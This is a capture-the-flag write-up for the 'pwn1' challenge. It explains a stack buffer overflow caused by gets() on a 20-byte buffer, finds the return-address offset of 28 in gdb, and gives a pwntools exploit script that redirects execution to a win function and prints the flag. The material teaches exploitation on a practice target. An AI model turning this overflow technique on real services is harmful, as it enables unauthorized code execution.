# pwn / pwn1

> Points: 1338

## Question

```
nc uwctf.ml 6002
```

## Solution

Let's open the binary in ghidra and look at the decompiled code
```c
undefined4 main(void) {
    undefined *puVar1;
    puVar1 = &stack0x00000004;
    setvbuf(stdout,(char *)0x0,2,0);
    setvbuf(stdin,(char *)0x0,2,0);
    puts("Welcome to Buffer Overflow 1");
    puts("Can you hack me again?");
    hack_me(puVar1);
    return 0;
}
```

It prints a message and then calls `hack_me`
```c
void hack_me(void) {
    char local_1c [20];
    gets(local_1c);
    return;
}
```

This function is vulnerable to a simple buffer overflow exploit.  
Writing more than 20 bytes into `local_1c` will overwrite whatever comes after it on the stack, usually that's some padding added by the compiler, the stack base pointer `ebp` of the previous function in the call stack, and the address of where to jump to when the function returns (the return address).  
If we can overwrite the return address we can jump anywhere within the program, thankfully the creator of this program left in a `win` function that prints the flag.
```c
void win(void) {
    system("/bin/cat ./flag.txt");
    return;
}
```

We can find exactly where the return value is stored on the stack by looking at the segfault we get in gdb
```
Welcome to Buffer Overflow 1
Can you hack me again?
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR

Program received signal SIGSEGV, Segmentation fault.
0x48484848 in ?? ()
```

The 0x48 from our segfault is ascii character `H`, meaning those `H`'s in the input string are at the correct offset to overwrite the return pointer, that's offset 28.  
The input we have to send in order to execute the win function will be 28 characters followed by the address of the win function.

Here's the final exploit using pwntools
```python
from pwn import *

exe = ELF("chall1.bin")
p = remote("uwctf.ml", 6002)
p.send(b"A" * 28 + p32(exe.sym["win"]) + b"\n")
p.clean_and_log(timeout=1)
```

### Flag

`uwctf{buff3r0v3rf10w1_00e342b9080e867c}`
